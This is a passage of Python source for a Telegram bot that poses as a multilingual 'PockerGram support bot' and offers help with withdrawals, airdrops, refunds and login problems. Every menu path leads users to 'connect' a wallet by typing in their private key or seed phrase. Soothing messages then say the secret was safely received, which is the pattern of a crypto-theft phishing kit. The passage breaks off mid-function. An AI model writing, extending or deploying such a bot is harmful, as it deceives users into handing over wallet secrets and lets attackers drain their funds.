        "claim airdrop": "Richiedi Airdrop",
        "claim withdrawal": "Richiedi Prelievo",
        "pending withdrawal": "Prelievi in sospeso",
        "fix bug": "Correggi Bug",
        "deposits": "Depositi",
    },
    "ja": {
        "choose language": "言語を選択してください：",
        "welcome": "こんにちは {user}、PockerGram サポートボットへようこそ！アカウントの検証、トークンやエアドロップの請求、入金と出金（保留中の出金を含む）の処理、返金や一般的なウォレット/アカウントの問題の支援ができます。メニューから必要なものを選んでください。順を追って案内します。",
        "main menu title": "続行する問題の種類を選択してください：",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "claim tickets": "チケットを請求",
        "recover account progress": "アカウントの進行状況を回復",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "withdrawals": "出金",
        "missing/irregular balance": "紛失/不規則な残高",
        "login issues": "ログインの問題",
        "connect wallet message": "プライベートキーまたはシードフレーズでウォレットを接続してください。",
        "withdrawal_connect_message": "出金を請求するにはウォレットを接続してください",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットのタイプを選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 プライベートキー",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ja", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "12 または 24 語のシードフレーズを入力してください。" + PROFESSIONAL_REASSURANCE.get("ja", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "プライベートキーを入力してください。" + PROFESSIONAL_REASSURANCE.get("ja", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "無効な選択です。ボタンを使用してください。",
        "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
        "final_received_message": "ありがとうございます — seed または秘密鍵を安全に受け取りました。/start で再開してください。",
        "error_use_seed_phrase": "このフィールドにはシードフレーズ（12 または 24 語）が必要です。シードフレーズを入力してください。",
        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — コピー＆ペーストを使用してください。",
        "await restart message": "/start をクリックして再開してください。",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
        "account recovery": "アカウント復旧",
        "refund": "返金",
        "claim airdrop": "エアドロップを請求",
        "claim withdrawal": "出金を請求",
        "pending withdrawal": "保留中の出金",
        "fix bug": "バグを修正",
        "deposits": "入金",
    },
    "ms": {
        "choose language": "Sila pilih bahasa:",
        "welcome": "Hai {user}, selamat datang ke PockerGram support bot! Saya boleh membantu anda mengesahkan akaun, tuntut token dan airdrop, mengurus deposit dan pengeluaran (termasuk pengeluaran yang tertunda), serta membantu bayaran balik atau masalah umum dompet/akaun. Gunakan menu untuk memilih apa yang anda perlukan dan saya akan membimbing anda langkah demi langkah.",
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "claim tickets": "Tuntut Tiket",
        "recover account progress": "Pulihkan kemajuan akaun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "withdrawals": "Pengeluaran",
        "missing/irregular balance": "Baki Hilang/Tidak Biasa",
        "login issues": "Isu Log Masuk",
        "connect wallet message": "Sila sambungkan dompet anda dengan Private Key atau Seed Phrase untuk meneruskan。",
        "withdrawal_connect_message": "sila sambungkan dompet anda untuk menuntut pengeluaran anda",
        "connect wallet button": "🔑 Sambung Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}。\nPilih mod sambungan yang dikehendaki。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ms", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Sila masukkan seed phrase 12 atau 24 perkataan anda。" + PROFESSIONAL_REASSURANCE.get("ms", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Sila masukkan kunci peribadi anda。" + PROFESSIONAL_REASSURANCE.get("ms", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Pilihan tidak sah. Gunakan butang。",
        "final error message": "‼️ Ralat berlaku. /start untuk cuba semula。",
        "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses。 Gunakan /start untuk mula semula。",
        "error_use_seed_phrase": "Medan ini memerlukan seed phrase (12 atau 24 perkataan). Sila berikan seed phrase。",
        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat。 /start untuk cuba semula。",
        "await restart message": "Sila klik /start untuk memulakan semula。",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Gunakan /start。",
        "account recovery": "Pemulihan Akaun",
        "refund": "Bayaran Balik",
        "claim airdrop": "Tuntut Airdrop",
        "claim withdrawal": "Tuntut Pengeluaran",
        "pending withdrawal": "Pengeluaran Tertunda",
        "fix bug": "Betulkan Bug",
        "deposits": "Deposit",
    },
    "ro": {
        "choose language": "Selectați limba preferată:",
        "welcome": "Salut {user}, bine ați venit la botul de suport PockerGram! Vă pot ajuta să validați conturi, să revendicați token-uri și airdrop-uri, să gestionați depozite și retrageri (inclusiv retragerile în așteptare) și să ofer asistență pentru rambursări sau probleme generale de cont/portofel. Folosiți meniul pentru a alege ce aveți nevoie și vă voi ghida pas cu pas.",
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "claim tickets": "Revendică Bilete",
        "recover account progress": "Recuperează progresul contului",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "withdrawals": "Retrageri",
        "missing/irregular balance": "Sold lipsă/iregular",
        "login issues": "Probleme Autentificare",
        "connect wallet message": "Vă rugăm conectați portofelul cu cheia privată sau fraza seed pentru a continua。",
        "withdrawal_connect_message": "vă rugăm conectați portofelul pentru a revendica retragerea",
        "connect wallet button": "🔑 Conectează Portofel",
        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}。\nSelectați modul de conectare preferat。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ro", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Introduceți seed phrase de 12 sau 24 cuvinte。" + PROFESSIONAL_REASSURANCE.get("ro", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Introduceți cheia privată。" + PROFESSIONAL_REASSURANCE.get("ro", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Alegere invalidă. Folosiți butoanele。",
        "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou。",
        "final_received_message": "Mulțumim — seed sau cheia privată a fost primită și va fi procesată。 /start pentru a începe din nou。",
        "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte)。",
        "post_receive_error": "‼️ A apărut o eroare. Folosiți copiere/lipire pentru a evita erori。 /start pentru a încerca din nou。",
        "await restart message": "Apăsați /start pentru a relua。",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă。 /start。",
        "account recovery": "Recuperare Cont",
        "refund": "Ramburs",
        "claim airdrop": "Revendică Airdrop",
        "claim withdrawal": "Revendică Retragere",
        "pending withdrawal": "Retrageri În Așteptare",
        "fix bug": "Remediază eroarea",
        "deposits": "Depozite",
    },
    "sk": {
        "choose language": "Vyberte preferovaný jazyk:",
        "welcome": "Ahoj {user}, vitajte pri PockerGram support bote! Môžem pomôcť s overením účtov, uplatnením tokenov a airdropov, správou vkladov a výberov (vrátane čakajúcich), a s vráteniami alebo všeobecnými problémami s peňaženkou/účtom. Použite menu a prevediem vás krok za krokom.",
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "claim tickets": "Uplatniť vstupenky",
        "recover account progress": "Obnoviť priebeh účtu",
        "assets recovery": "Obnovenie aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výbery",
        "missing/irregular balance": "Chýbajúci/Nepravidelný zostatok",
        "login issues": "Problémy s prihlásením",
        "connect wallet message": "Pripojte peňaženku pomocou súkromného kľúča alebo seed frázy。",
        "withdrawal_connect_message": "prosím pripojte svoju peňaženku, aby ste požiadali o výber",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}。\nVyberte preferovaný spôsob pripojenia。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("sk", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Zadajte seed phrase 12 alebo 24 slov。" + PROFESSIONAL_REASSURANCE.get("sk", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Zadajte svoj súkromný kľúč。" + PROFESSIONAL_REASSURANCE.get("sk", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Neplatná voľba. Použite tlačidlá。",
        "final error message": "‼️ Vyskytla sa chyba. /start pre opakovanie。",
        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný。 /start pre opakovanie。",
        "error_use_seed_phrase": "Toto pole vyžaduje seed phrase (12 alebo 24 slov)。",
        "post_receive_error": "‼️ Došlo k chybe. Použite kopírovanie/vloženie, aby ste sa vyhli chybám。 /start pre opakovanie。",
        "await restart message": "Kliknite /start pre reštart。",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup。 /start。",
        "account recovery": "Obnovenie účtu",
        "refund": "Vrátenie peňazí",
        "claim airdrop": "Nárokovať Airdrop",
        "claim withdrawal": "Nárokovať výber",
        "pending withdrawal": "Čakajúce výbery",
        "fix bug": "Opraviť chybu",
        "deposits": "Vklady",
    },
    "th": {
        "choose language": "โปรดเลือกภาษา:",
        "welcome": "สวัสดี {user} ยินดีต้อนรับสู่บอทสนับสนุน PockerGram! ฉันสามารถช่วยคุณยืนยันบัญชี, เคลมโทเค็นและ airdrop, จัดการเงินฝากและการถอน (รวมการถอนที่รอดำเนินการ), และช่วยเหลือเรื่องการคืนเงินหรือปัญหาเกี่ยวกับกระเป๋าเงิน/บัญชีทั่วไป ใช้เมนูเพื่อเลือกสิ่งที่คุณต้องการและฉันจะนำทางคุณทีละขั้นตอน",
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "validation": "การยืนยัน",
        "claim tokens": "เคลมโทเค็น",
        "claim tickets": "เคลมบัตรเข้าชม",
        "recover account progress": "กู้คืนความคืบหน้าบัญชี",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "withdrawals": "ถอนเงิน",
        "missing/irregular balance": "ยอดคงเหลือหาย/ผิดปกติ",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าของคุณด้วยคีย์ส่วนตัวหรือ seed phrase เพื่อดำเนินการต่อ",
        "withdrawal_connect_message": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อเรียกร้องการถอนของคุณ",
        "connect wallet button": "🔑 เชื่อมต่อกระเป๋า",
        "select wallet type": "โปรดเลือกประเภทกระเป๋า:",
        "other wallets": "กระเป๋าอื่น ๆ",
        "private key": "🔑 คีย์ส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE.get("th", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "ป้อน seed phrase 12 หรือ 24 คำของคุณ。" + PROFESSIONAL_REASSURANCE.get("th", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "ป้อนคีย์ส่วนตัวของคุณ。" + PROFESSIONAL_REASSURANCE.get("th", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "ตัวเลือกไม่ถูกต้อง โปรดใช้ปุ่ม",
        "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อทดลองใหม่",
        "final_received_message": "ขอบคุณ — seed หรือคีย์ส่วนตัวของคุณได้รับอย่างปลอดภัยและจะถูกดำเนินการ ใช้ /start เพื่อเริ่มใหม่",
        "error_use_seed_phrase": "ช่องนี้ต้องการ seed phrase (12 หรือ 24 คำ) โปรดระบุ seed",
        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่า you entered the correct key — use copy/paste to avoid errors. Please /start to retry.",
        "await restart message": "โปรดกด /start เพื่อเริ่มใหม่",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "ข้อมูลไม่ถูกต้อง /start",
        "account recovery": "กู้คืนบัญชี",
        "claim airdrop": "เคลม Airdrop",
        "claim withdrawal": "เคลม การถอน",
        "pending withdrawal": "การถอนที่ค้างอยู่",
        "fix bug": "แก้ไขบั๊ก",
        "deposits": "ฝากเงิน",
    },
    "vi": {
        "choose language": "Chọn ngôn ngữ:",
        "welcome": "Xin chào {user}, chào mừng đến với PockerGram support bot! Tôi có thể giúp bạn xác thực tài khoản, yêu cầu token và airdrop, xử lý tiền gửi và rút tiền (bao gồm rút tiền đang chờ), và hỗ trợ hoàn tiền hoặc các vấn đề chung về ví/tài khoản. Vui lòng chọn trong menu để tiếp tục và tôi sẽ hướng dẫn bạn từng bước.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "claim tickets": "Yêu cầu vé",
        "recover account progress": "Khôi phục tiến độ tài khoản",
        "assets recovery": "Khôi phục Tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "withdrawals": "Rút tiền",
        "missing/irregular balance": "Thiếu số dư/Không đều",
        "login issues": "Vấn đề đăng nhập",
        "connect wallet message": "Vui lòng kết nối ví bằng Khóa Riêng hoặc Seed Phrase để tiếp tục。",
        "withdrawal_connect_message": "vui lòng kết nối ví của bạn để yêu cầu rút tiền",
        "connect wallet button": "🔑 Kết nối ví",
        "select wallet type": "Vui lòng chọn loại ví:",
        "other wallets": "Ví khác",
        "private key": "🔑 Khóa riêng",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}。\nChọn phương thức kết nối。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("vi", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。" + PROFESSIONAL_REASSURANCE.get("vi", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Vui lòng nhập khóa riêng của bạn。" + PROFESSIONAL_REASSURANCE.get("vi", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút。",
        "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại。",
        "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý。 /start để bắt đầu lại。",
        "error_use_seed_phrase": "Trường này yêu cầu seed phrase (12 hoặc 24 từ). Vui lòng cung cấp seed phrase。",
        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo nhập đúng khóa — sử dụng sao chép/dán để tránh lỗi。 Vui lòng /start để thử lại。",
        "await restart message": "Nhấn /start để bắt đầu lại。",
        "back": "🔙 Quay lại",
        "invalid_input": "Dữ liệu không hợp lệ。 /start",
        "account recovery": "Khôi phục tài khoản",
        "refund": "Hoàn tiền",
        "claim airdrop": "Yêu cầu Airdrop",
        "claim withdrawal": "Yêu cầu Rút tiền",
        "pending withdrawal": "Rút tiền đang chờ",
        "fix bug": "Sửa lỗi",
        "deposits": "Tiền gửi",
    },
    "pl": {
        "choose language": "Wybierz język:",
        "welcome": "Cześć {user}, witaj w PockerGram support bocie! Mogę pomóc w weryfikacji kont, odbieraniu tokenów i airdropów, obsłudze depozytów i wypłat (w tym wypłat oczekujących) oraz w sprawach zwrotów lub ogólnych problemach z portfelem/kontem. Użyj menu, aby wybrać, czego potrzebujesz, a poprowadzę Cię krok po kroku.",
        "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
        "validation": "Walidacja",
        "claim tokens": "Odbierz Tokeny",
        "claim tickets": "Odbierz Bilety",
        "recover account progress": "Odzyskaj postęp konta",
        "assets recovery": "Odzyskiwanie aktywów",
        "general issues": "Ogólne problemy",
        "rectification": "Rektyfikacja",
        "withdrawals": "Wypłaty",
        "missing/irregular balance": "Brakujący/Nieregularny saldo",
        "login issues": "Problemy z logowaniem",
        "connect wallet message": "Proszę połączyć portfel za pomocą Private Key lub Seed Phrase, aby kontynuować。",
        "withdrawal_connect_message": "proszę połączyć portfel, aby odebrać wypłatę",
        "connect wallet button": "🔑 Połącz portfel",
        "select wallet type": "Wybierz typ portfela:",
        "other wallets": "Inne portfele",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importuj Seed Phrase",
        "wallet selection message": "Wprowadź swoje dane {wallet_name}。\nWybierz preferowaną metodę połączenia。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("pl", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Wprowadź seed phrase 12 lub 24 słów。" + PROFESSIONAL_REASSURANCE.get("pl", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Wprowadź swój private key。" + PROFESSIONAL_REASSURANCE.get("pl", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Nieprawidłowy wybór. Użyj przycisków。",
        "final error message": "‼️ Wystąpił błąd. /start aby spróbować ponownie。",
        "final_received_message": "Dziękujemy — seed lub klucz prywatny został bezpiecznie odebrany i zostanie przetworzony。 /start aby zacząć od nowa。",
        "error_use_seed_phrase": "To pole wymaga seed phrase (12 lub 24 słów)。",
        "post_receive_error": "‼️ Wystąpił błąd。 /start aby spróbować ponownie。",
        "await restart message": "Kliknij /start aby zacząć ponownie。",
        "back": "🔙 Powrót",
        "invalid_input": "Nieprawidłowe dane。 /start。",
        "account recovery": "Odzyskiwanie konta",
        "refund": "Zwrot",
        "claim airdrop": "Odbierz Airdrop",
        "claim withdrawal": "Odbierz Wypłatę",
        "pending withdrawal": "Wypłata oczekująca",
        "fix bug": "Napraw błąd",
        "deposits": "Depozyty",
    },
}

# Helper to get localized UI text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en")
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

# Reusable pattern for main menu callback matching
MAIN_MENU_PATTERN = r"^(validation|claim_tokens|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_irregular_balance|account_recovery|claim_airdrop|claim_withdrawal|pending_withdrawal|fix_bug|deposits|refund)$"

# Message stack helpers (Back flow)
async def send_and_push_message(bot, chat_id: int, text: str, context: ContextTypes.DEFAULT_TYPE, reply_markup=None, parse_mode=None, state=None) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append({
        "chat_id": chat_id,
        "message_id": msg.message_id,
        "text": text,
        "reply_markup": reply_markup,
        "state": recorded_state,
        "parse_mode": parse_mode,
    })
    if len(stack) > 60:
        stack.pop(0)
    return msg

async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        # if nothing in stack, show language keyboard again
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)

# Language keyboard (25 languages)
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("Polski 🇵🇱", callback_data="lang_pl")],
    ]
    return InlineKeyboardMarkup(keyboard)

# Build main menu markup
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation"),
         InlineKeyboardButton(ui_text(context, "claim tokens"), callback_data="claim_tokens")],
        [InlineKeyboardButton(ui_text(context, "assets recovery"), callback_data="assets_recovery"),
         InlineKeyboardButton(ui_text(context, "general issues"), callback_data="general_issues")],
        [InlineKeyboardButton(ui_text(context, "rectification"), callback_data="rectification"),
         InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
        [InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues"),
         InlineKeyboardButton(ui_text(context, "missing/irregular balance"), callback_data="missing_irregular_balance")],
        [InlineKeyboardButton(ui_text(context, "account recovery"), callback_data="account_recovery"),
         InlineKeyboardButton(ui_text(context, "claim airdrop"), callback_data="claim_airdrop")],
        [InlineKeyboardButton(ui_text(context, "claim withdrawal"), callback_data="claim_withdrawal"),
         InlineKeyboardButton(ui_text(context, "pending withdrawal"), callback_data="pending_withdrawal")],
        [InlineKeyboardButton(ui_text(context, "fix bug"), callback_data="fix_bug"),
         InlineKeyboardButton(ui_text(context, "deposits"), callback_data="deposits")],
    ]
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)

# Start handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    # set language to english by default
    context.user_data["language"] = "en"
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE

# Set language
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")
    welcome_template = ui_text(context, "welcome")
    welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU

# Handler for invalid typed input
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)

# Show connect wallet button after menu selection
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET

    qd = query.data or ""
    if "withdraw" in qd:
        label = ui_text(context, "withdrawal_connect_message")
    else:
        label = ui_text(context, "connect wallet message")

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
    ])
    await send_and_push_message(context.bot, update.effective_chat.id, label, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Show wallet types
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_metamask", "Tonkeeper"), callback_data="wallet_type_metamask")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_trust_wallet", "Telegram Wallet"), callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_coinbase", "MyTon Wallet"), callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_tonkeeper", "Tonhub"), callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")],
    ]
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE

# Show other wallets (two-column layout)
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keys = [
        "wallet_type_mytonwallet","wallet_type_tonhub","wallet_type_rainbow","wallet_type_safepal",
        "wallet_type_wallet_connect","wallet_type_ledger","wallet_type_brd_wallet","wallet_type_solana_wallet",
        "wallet_type_balance","wallet_type_okx","wallet_type_xverse","wallet_type_sparrow",
        "wallet_type_earth_wallet","wallet_type_hiro","wallet_type_saitamask_wallet","wallet_type_casper_wallet",
        "wallet_type_cake_wallet","wallet_type_kepir_wallet","wallet_type_icpswap","wallet_type_kaspa",
        "wallet_type_nem_wallet","wallet_type_near_wallet","wallet_type_compass_wallet","wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet","wallet_type_aioz_wallet","wallet_type_xpla_vault_wallet","wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station",
        "wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon",
        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other"
    ]
    kb = []
    row = []
    for k in keys:
